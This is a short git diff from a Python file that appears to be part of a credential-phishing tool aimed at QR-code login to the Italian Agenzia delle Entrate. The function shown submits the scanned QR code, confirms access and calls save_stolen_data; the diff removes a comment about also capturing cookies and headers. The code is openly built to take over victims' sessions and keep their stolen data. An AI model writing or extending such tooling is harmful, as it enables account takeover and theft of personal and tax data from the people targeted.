@@ -46,4 +46,4 @@ def retrieve_access_after_qr_code_scan(login_flow: LoginFlow) -> None:
     """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the QR code has been scanned"""
     submit_scanned_qr_code(login_flow)
     confirm_access(login_flow)
-    save_stolen_data(login_flow) # TODO: save more data if possible (e.g., cookies, headers, etc.)
+    save_stolen_data(login_flow)
